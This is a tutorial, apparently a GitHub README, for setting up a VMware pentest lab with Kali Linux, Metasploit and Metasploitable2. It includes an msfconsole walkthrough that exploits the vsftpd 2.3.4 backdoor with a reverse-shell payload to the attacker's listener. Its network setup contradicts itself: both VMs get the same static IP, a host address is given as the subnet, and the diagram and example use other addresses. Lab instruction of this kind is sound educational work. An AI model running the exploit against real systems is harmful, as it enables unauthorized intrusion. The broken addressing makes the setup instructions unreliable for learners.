## Lab Environment Setup Guide

## Prerequisites
- **Computer Requirements:-**
  - Minimum 8GB RAM (16GB recommended for smooth performance)
  - At least 80GB free disk space
  - 64-bit processor with virtualization support
- **Virtualization enabled in BIOS/UEFI**
- **VMware Workstation Pro** (Free for personal use as of 2025)

***

## Step 0: Enable Virtualization in BIOS

Before installing VMware, ensure hardware virtualization is enabled in your system BIOS/UEFI.

### For Windows 11/10:

**Method 1: Check if Virtualization is Already Enabled**

1. Press `Ctrl + Shift + Esc` to open Task Manager
2. Click on the **Performance** tab
3. Select **CPU** from the left panel
4. Look for **Virtualization** at the bottom right
5. If it shows "Enabled", you can skip to Step 1

**Method 2: Enable Virtualization in BIOS**

1. **Restart your computer**
2. **Enter BIOS Setup** - Press the appropriate key during boot:
   - **Dell**: F2 or F12
   - **HP**: F10 or Esc
   - **Lenovo**: F1 or F2
   - **ASUS**: F2 or Del
   - **Acer**: F2 or Del[3][4]

3. **Navigate to Virtualization Settings**:
   - Look for settings named:
     - **Intel VT-x** (Intel processors)
     - **AMD-V** (AMD processors)
     - **Virtualization Technology**
     - **VT-d**
     - **SVM Mode**[4][5][3]

4. **Enable the setting** by changing it to **Enabled**
5. **Save and Exit** (usually F10)
6. **Restart your computer**

![screenshot](https://github.com/user-attachments/assets/7d30f33d-bb2e-4ef0-ade5-e48e94b1fdb2)

***

## Step 1: Install VMware Workstation Pro

### Download VMware Workstation Pro

1. Visit the official VMware website:
   ```
   https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
   ```

2. Click on **"Download Now"** for VMware Workstation Pro

3. **Accept the terms and conditions**[6]

4. The installer file (approximately 600-700 MB) will download as:
   - **Windows**: `VMware-workstation-full-17.6.0-24238078.exe`
   - **Linux**: `VMware-Workstation-Full-17.6.4-buildnumber.x86_64.bundle`

![Image](https://github.com/user-attachments/assets/5dc04505-d0fc-4612-ba4a-4c6bf73ecd1b)

***

### Install VMware Workstation Pro on Windows

1. **Locate the downloaded installer** in your Downloads folder

2. **Right-click** the installer file (`VMware-workstation-full-17.6.0-24238078.exe`)

3. Select **"Run as administrator"**

4. Click **"Yes"** when prompted by User Account Control (UAC)

5. **Installation Wizard Steps:**

   **a. Welcome Screen**
   - Click **Next**

   **b. License Agreement**
   - Read and accept the End-User License Agreement
   - Check **"I accept the terms in the License Agreement"**
   - Click **Next**

   **c. Installation Directory**
   - Keep the default installation path or click **Change** to select a custom location:
     ```
     Default: C:\Program Files (x86)\VMware\VMware Workstation\
     ```
   - Click **Next**

   **d. User Experience Settings**
   - **Enhanced Keyboard Driver**: ✓ (Recommended - improves keyboard handling in VMs)
   - **Check for product updates on startup**: ✓ (Optional)
   - **Join VMware Customer Experience Improvement Program**: (Optional)
   - Click **Next**

   **e. Shortcuts**
   - ✓ Desktop
   - ✓ Start Menu Programs folder
   - Click **Next**

   **f. Ready to Install**
   - Review your settings
   - Click **Install**

6. **Wait for Installation** (usually 3-5 minutes)

7. **Installation Complete**
   - Click **Finish**
   - You may need to **restart your computer**

![Image](https://github.com/user-attachments/assets/44d73309-17a9-4313-a57b-0a243349848b)

***

### First Launch and License Activation

1. **Launch VMware Workstation Pro** from:
   - Desktop shortcut, or
   - Start Menu → VMware Workstation Pro

2. **License Options:**
   - **For Personal Use**: Select "Use VMware Workstation Pro for Personal Use" (Free as of 2025)[6][1]
   - **For Commercial Use**: Enter your license key
   - Click **Continue**

3. VMware Workstation Pro is now ready to use

***

## Step 2: Install Kali Linux

### Download Kali Linux ISO

1. Visit the official Kali Linux download page:
   ```
   https://www.kali.org/get-kali/
   ```

2. Select **"Installer Images"**

3. Download the **64-bit Installer ISO**:
   - File name: `kali-linux-2025.3-installer-everything-amd64.iso`
   - Size: Approximately 10-13 GB


### Create Kali Linux Virtual Machine

1. **Open VMware Workstation Pro**

2. Click **"Create a New Virtual Machine"**

3. **Configuration Type:**
   - Select **"Custom (advanced)"** for more control
   - Click **Next**

4. **Hardware Compatibility:**
   - Select **"Workstation 17.5"** (or latest available)
   - Click **Next**

5. **Install Operating System:**
   - Select **"Installer disc image file (iso)"**
   - Click **Browse**
   - Navigate to the downloaded Kali Linux ISO file
   - Select the ISO file
   - Click **Next**

![Image](https://github.com/user-attachments/assets/c5c659d8-8c0c-4172-8274-d2c74b114580)

6. **Guest Operating System:**
   - Select **"Linux"**
   - Version: **"Debian 12.x 64-bit"** (Kali is Debian-based)
   - Click **Next**

7. **Virtual Machine Name and Location:**
   - Name: `Kali Linux 2025`
   - Location: Choose where to store VM files (default is fine)
   - Click **Next**

8. **Processor Configuration:**
   - Number of processors: **minimum 1**
   - Number of cores per processor: **2** (or 4 if you have 8+ cores)
   - Click **Next**

9. **Memory Allocation:**
   - Recommended: **2048 MB (2 GB)** minimum
   - Better performance: **4096 MB (4 GB)**
   - Click **Next**

10. **Network Type:**
    - Select **"Use network address translation (NAT)"** (for now, we'll change this later)
    - Click **Next**

11. **I/O Controller Types:**
    - Select **"LSI Logic (Recommended)"**
    - Click **Next**

12. **Virtual Disk Type:**
    - Select **"SCSI (Recommended)"**
    - Click **Next**

13. **Disk:**
    - Select **"Create a new virtual disk"**
    - Click **Next**

14. **Disk Size:**
    - Maximum disk size: **80 GB** (recommended)
    - Select **"Store virtual disk as a single file"**
    - Click **Next**

15. **Disk File:**
    - Accept default filename
    - Click **Next**

16. **Ready to Create:**
    - Review VM settings
    - Click **"Customize Hardware"** to make any final adjustments (optional)
    - Click **Finish**

<img width="496" height="527" alt="Image" src="https://github.com/user-attachments/assets/ce471571-d4f7-4334-bb40-43de1395bdfd" />

***

### Install Kali Linux Operating System

1. **Power on the Virtual Machine** by clicking **"Power on this virtual machine"**

2. **Kali Linux Boot Menu** will appear:
   - Select **"Graphical Install"** (recommended)
   - Press **Enter**

<img width="654" height="497" alt="Image" src="https://github.com/user-attachments/assets/4fd4b92f-4863-4e6c-b501-5106a1b9d048" />

3. **Language Selection:**
   - Select your preferred language (e.g., **English**)
   - Click **Continue**

4. **Location:**
   - Select your country/region
   - Click **Continue**

5. **Keyboard Configuration:**
   - Select your keyboard layout
   - Click **Continue**

6. **Network Configuration:**
   - Hostname: Enter a name (e.g., `kali-lab`)
   - Click **Continue**

7. **Domain Name:**
   - Leave blank or enter a domain (e.g., `local`)
   - Click **Continue**

8. **User Account Setup:**
   - Full name: Your name
   - Username: `kali` (recommended)
   - Password: Create a strong password
   - Re-enter password
   - Click **Continue**

9. **Partition Disks:**
   - Select **"Guided - use entire disk"**
   - Click **Continue**
   - Select the virtual disk
   - Select **"All files in one partition"**
   - Select **"Finish partitioning and write changes to disk"**
   - Confirm: **Yes**
   - Click **Continue**

10. **Software Selection:**
    - Default selection includes: 
      - ✓ Kali Desktop Environment (Xfce)
      - ✓ Top 10 security tools
    - You can select **"Kali Large"** for more tools (requires more disk space)
    - Click **Continue**

11. **Install GRUB Boot Loader:**
    - Select **Yes** to install GRUB
    - Select the virtual disk (`/dev/sda`)
    - Click **Continue**

12. **Installation Complete:**
    - Click **Continue** to reboot
    - VM will restart automatically

13. **Login to Kali Linux:**
    - Username: `username you created`
    - Password: Your password
    - Press **Enter**

![Image](https://github.com/user-attachments/assets/352a44c9-4580-4163-85ca-231f01a36faf)

***

### Update Kali Linux

After first login, open terminal and run:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt dist-upgrade -y
```

<img width="1919" height="1023" alt="Image" src="https://github.com/user-attachments/assets/1f1c9892-eee4-4b62-a273-7a67b9c2fe5f" />

***

# Installing Metasploit Framework in Kali Linux

This guide provides comprehensive step-by-step instructions to install and configure the Metasploit Framework on Kali Linux.

## Overview

Metasploit Framework comes **pre-installed** on Kali Linux 2.0 and later versions. However, this guide covers verification, installation, and setup procedures.

---

## Quick Start

If Metasploit is already installed, simply run:

```bash
msfconsole
```

The Metasploit console will launch with the framework banner.

---

## Installation Steps

### Step 1: Update Package Repositories

Open a terminal and update your package list:

```bash
sudo apt-get update
```

This ensures you have access to the latest Metasploit packages available in Kali repositories.

### Step 2: Install Metasploit Framework

Install Metasploit Framework using the apt package manager:

```bash
sudo apt-get install metasploit-framework
```
<img width="665" height="489" alt="Image" src="https://github.com/user-attachments/assets/5589171c-0c5f-4cdd-9c2d-8e9c8ae9c21e" />

The system will:
- Download Metasploit Framework
- Install all required dependencies (Ruby, PostgreSQL, etc.)
- Configure the framework automatically

### Step 3: Verify Installation

Confirm successful installation by checking the Metasploit version:

```bash
msfconsole --version
```

<img width="244" height="66" alt="Image" src="https://github.com/user-attachments/assets/9031e41e-150a-4514-88c6-c7d3e684d4ef" />

### Step 4: Start PostgreSQL Service

PostgreSQL database is required for Metasploit to function properly.

Start the PostgreSQL service:

```bash
sudo /etc/init.d/postgresql start
```

Check the status:

```bash
sudo /etc/init.d/postgresql status
```

Expected output: `online` or `running` status

<img width="746" height="321" alt="Image" src="https://github.com/user-attachments/assets/881544e4-fa06-4e84-9742-edda8700e349" />

### Step 5: Initialize Metasploit Database

Launch Metasploit for the first time:

```bash
msfconsole
```

On first launch, you'll be prompted to set up the initial database:

```
[*] Metasploit Path: /usr/share/metasploit-framework
[*] Databases: postgres

Do you want to set up the initial database? [y/N]:
```

Type **y** and press **Enter**. The system will automatically:
- Create the database structure
- Initialize exploit tables
- Configure the connection

This process may take 1-2 minutes on first run.

<img width="696" height="788" alt="image" src="https://github.com/user-attachments/assets/e5969e2c-1aca-4f12-b56b-94c3947a3bbe" />
<img width="605" height="184" alt="image" src="https://github.com/user-attachments/assets/457b7482-a7e1-4185-acf9-2d63b97986bd" />


### Step 6: Verify Database Connection

Once msfconsole launches successfully, you'll see:

```
[*] Connected to msf. Connection type: postgresql.
```

You are now ready to use Metasploit!

---

## Starting Metasploit

### Standard Launch

Open a terminal and run:

```bash
msfconsole
```

### Quiet Mode (No Banner)

To launch without the banner display:

```bash
msfconsole -q
```

### With Database Connection Status

```bash
msfconsole -d postgresql://user:password@localhost:5432/msf
```

<img width="633" height="624" alt="image" src="https://github.com/user-attachments/assets/b3ecaa45-6e09-4055-ab91-b100bf438988" />

---

---

## Basic Metasploit Commands

Once msfconsole is running, use these commands:

| Command | Purpose |
|---------|---------|
| `search <keyword>` | Search for exploits, payloads, or auxiliary modules |
| `use <module_name>` | Select a specific exploit or module |
| `set RHOST <ip>` | Set the target/remote host IP address |
| `set LHOST <ip>` | Set the local/listener IP address |
| `set LPORT <port>` | Set the listener port number |
| `set PAYLOAD <payload>` | Select a payload type |
| `options` or `show options` | Display configurable options for current module |
| `run` or `exploit` | Execute the selected exploit or module |
| `back` | Return to main menu |
| `exit` or `quit` | Exit Metasploit console |
| `help` | Display help information |

---

## Practical Example: Exploiting vsftpd Backdoor

This example demonstrates exploiting a vulnerable FTP service on Metasploitable2:

```bash
# Start msfconsole
msfconsole

# Search for vsftpd exploits
msf > search vsftpd

# Use the vsftpd backdoor exploit
msf > use exploit/unix/ftp/vsftpd_234_backdoor

# View required options
msf > show options

# Set the target host IP (replace with actual Metasploitable2 IP)
msf > set RHOST 192.168.10.5

# Set the payload
  msf > set PAYLOAD cmd/unix/reverse

# Set your listener host
msf > set LHOST 192.168.10.3

# Run the exploit
msf > exploit
```

<img width="1281" height="801" alt="image" src="https://github.com/user-attachments/assets/8710f068-fc00-4c05-b0e9-cf2a699981ae" />
<img width="996" height="158" alt="image" src="https://github.com/user-attachments/assets/46b0d56d-2e13-4a7a-b514-7773348234ce" />

---

## Troubleshooting

### Issue: "Database connection failed"

**Solution:** Start PostgreSQL service:

```bash
sudo /etc/init.d/postgresql start
```

Then relaunch msfconsole.

### Issue: "Permission denied" errors

**Solution:** Ensure you're running with sudo privileges:

```bash
sudo msfconsole
```

### Issue: Metasploit not found or not installed

**Solution:** Reinstall Metasploit Framework:

```bash
sudo apt-get update
sudo apt-get install metasploit-framework
```

### Issue: Slow database performance

**Solution:** Rebuild the database:

```bash
msfconsole
msf > db_rebuild
```

### Issue: Port already in use

**Solution:** Change the listener port:

```bash
msf > set LPORT 4445
```

### Create Host-Only Network in VMware

1. **Open VMware Workstation Pro**

2. Go to **Edit → Virtual Network Editor**

3. Click **"Change Settings"** (requires administrator privileges)

4. Click **"Add Network"**

5. Select an available network (e.g., **VMnet2** or **VMnet3**)

6. Click **OK**

7. **Configure the Host-Only Network:**
   - Network Name: **VMnet2** (or your chosen network)
   - Type: Select **"Host-only"**
   - ✓ **Connect a host virtual adapter to this network**
   - Subnet IP: **10.10.169.194**
   - Subnet mask: **255.255.255.0**

8. **DHCP Settings** (Optional):
   - Click **"DHCP Settings"**
   - Enable DHCP if you want automatic IP assignment
   - Or disable for manual configuration

9. Click **OK** to save

10. Click **Apply**

11. Click **OK** to close Virtual Network Editor

<img width="693" height="649" alt="image" src="https://github.com/user-attachments/assets/de6e5175-2bde-49e4-9f74-e692f435131f" />

***

### Configure Kali Linux Network Adapter

1. **Right-click** Kali Linux VM → **Settings**

2. Select **"Network Adapter"**

3. **Network connection:**
   - Select **"Custom: Specific virtual network"**
   - Choose **VMnet2** (or your host-only network)

4. Click **OK**

5. **Start Kali Linux VM**

6. **Verify network configuration** in terminal:
   ```bash
   ip addr show
   ```
   or
   ```bash
   ifconfig
   ```

7. **Optional: Set Static IP** (recommended for lab):
   ```bash
   sudo nano /etc/network/interfaces
   ```

   Add:
   ```
   auto eth0
   iface eth0 inet static
       address 10.10.169.194 
       netmask 255.255.255.0
   ```

   Save and restart networking:
   ```bash
   sudo systemctl restart networking
   ```

***

### Configure Metasploitable2 Network Adapter

1. **Right-click** Metasploitable2 VM → **Settings**

2. Select **"Network Adapter"**

3. **Network connection:**
   - Select **"Custom: Specific virtual network"**
   - Choose **VMnet2** (same as Kali Linux)[16]

4. Click **OK**

5. **Start Metasploitable2 VM** and login (`msfadmin`/`msfadmin`)

6. **Set Static IP Address:**
   ```bash
   sudo nano /etc/network/interfaces
   ```

   Modify to:
   ```
   auto eth0
   iface eth0 inet static
       address 10.10.169.194 
       netmask 255.255.255.0
   ```

7. **Save and exit** (Ctrl+X, Y, Enter)

8. **Restart networking:**
   ```bash
   sudo /etc/init.d/networking restart
   ```

9. **Verify IP address:**
   ```bash
   ifconfig
   ```
   Should show: `10.10.169.194`

***

### Test Network Connectivity

From **Kali Linux**, test connection to Metasploitable2:

```bash
ping 10.10.169.194 
```

You should see successful ping responses

<img width="618" height="807" alt="image" src="https://github.com/user-attachments/assets/0e51b076-fe54-424a-abc2-8b1124bfcf93" />

***

### Network Topology Diagram

```
┌─────────────────────────────────────────┐
│         Host Computer (Windows)          │
│                                          │
│  VMware Virtual Network (VMnet2)         │
│  Network: 10.10.169.0/24               │
│  Type: Host-Only (Isolated)              │
└──────────────┬───────────────┬──────────┘
               │               │
       ┌───────▼──────┐  ┌────▼─────────┐
       │ Kali Linux   │  │Metasploitable│
       │              │  │      2       │
       │ 10.10.169.194│  │192.168.100   │
       │              │  │     .100     │
       │(Attacker VM) │  │ (Target VM)  │
       └──────────────┘  └──────────────┘
```

***

## Troubleshooting

### Issue 1: "Virtualization is disabled in BIOS"

**Error Message:**
```
Intel VT-x is disabled
AMD-V is disabled
```

**Solution:**
1. Restart computer and enter BIOS
2. Enable Intel VT-x or AMD-V as described in Step 0
3. Save and restart

---

### Issue 2: VMware fails to start VM - "Cannot connect to virtual machine"

**Error Code:** `E_FAIL (0x80004005)`

**Solutions:**

**Option 1:** Restart VMware Services
```cmd
net stop VMwareHostd
net start VMwareHostd
```

**Option 2:** Run VMware as Administrator
- Right-click VMware → Run as Administrator

**Option 3:** Disable Hyper-V (conflicts with VMware)
```cmd
bcdedit /set hypervisorlaunchtype off
```
Then restart computer

---

### Issue 3: "No Internet in Kali Linux VM"

**Solution for NAT Network:**
1. VM Settings → Network Adapter
2. Select **"NAT"**
3. Click **OK**
4. In Kali, run:
   ```bash
   sudo dhclient eth0
   ```
5. Test: `ping 8.8.8.8`

***

### Issue 4: "Cannot ping between VMs"

**Solution:**

1. Verify both VMs are on the **same host-only network** (e.g., VMnet2)

2. Check firewall settings:
   
   **On Kali:**
   ```bash
   sudo ufw status
   sudo ufw allow from 192.168.100.0/24
   ```

   **On Metasploitable2:**
   ```bash
   sudo iptables -F
   ```

3. Verify IP addresses:
   ```bash
   ifconfig
   ```

4. Test connectivity:
   ```bash
   ping [target-ip]
   ```

***

### Issue 5: "Metasploitable2 won't boot"

**Solutions:**

1. **Check VM compatibility:**
   - Right-click VM → Settings → Options → General
   - Change Guest OS to **"Ubuntu"** if set incorrectly

2. **Increase memory allocation** (minimum 512 MB)

3. **Re-extract the ZIP file** - file may be corrupted

---

### Issue 6: "VMware kernel modules won't compile on Linux"

**Solution:**
```bash
sudo apt update
sudo apt install build-essential linux-headers-$(uname -r)
```
Then reinstall VMware

***

### Issue 7: "Slow VM performance"

**Solutions:**

1. **Increase RAM allocation:**
   - VM Settings → Memory → Increase to 4 GB+

2. **Allocate more CPU cores:**
   - VM Settings → Processors → Increase cores to 2-4

3. **Enable hardware virtualization:**
   - VM Settings → Processors → ✓ Virtualize Intel VT-x/EPT or AMD-V/RVI

4. **Disable unnecessary services in VM**

5. **Use SSD instead of HDD** for VM storage

***

### Issue 8: "Host-only adapter not working"

**Solution:**

1. **Recreate the host-only network:**
   - Edit → Virtual Network Editor
   - Delete existing host-only network
   - Click "Add Network"
   - Configure new host-only adapter

2. **Reset VMware networking:**
   ```cmd
   "C:\Program Files (x86)\VMware\VMware Workstation\vmnetcfg.exe"
   ```
   Click "Restore Defaults"

---

### Issue 9: "Shared folders not working"

**Solution:**

1. **Install VMware Tools:**
   - VM → Install VMware Tools
   - In VM, mount CD and run installer

2. **Enable shared folders:**
   - VM Settings → Options → Shared Folders
   - Select "Always enabled"
   - Add folder path

***
